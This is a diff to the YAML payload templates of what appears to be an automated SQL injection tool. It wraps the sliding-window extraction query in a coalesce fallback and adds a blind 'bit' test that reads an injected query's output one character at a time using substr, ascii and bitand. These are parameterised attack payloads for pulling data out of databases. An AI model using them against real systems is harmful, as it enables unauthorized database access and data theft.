@@ -132,13 +132,16 @@ strategy:
   slidingWindow: |
    select
        '${lead}'
-       || substr(
-           r,
-           ${window.char},
-           /**
-            * Minus '${lead}' should apply
-            */
-           ${capacity}
+       || coalesce(
+           substr(
+               r,
+               ${window.char},
+               /**
+                * Minus '${lead}' should apply
+                */
+               ${capacity}
+           ),
+           '${trail_sql}'
        )
    from (
        ${injection}
@@ -161,6 +164,17 @@ strategy:
 
  binary:
   test:
+   bit: |
+    0 != bitand(
+        ascii(
+            substr(
+                (${injection}),
+                ${window.char},
+                1
+            )
+        ),
+        ${bit}
+    )
    bin: |
     substr(
         (${injection}),
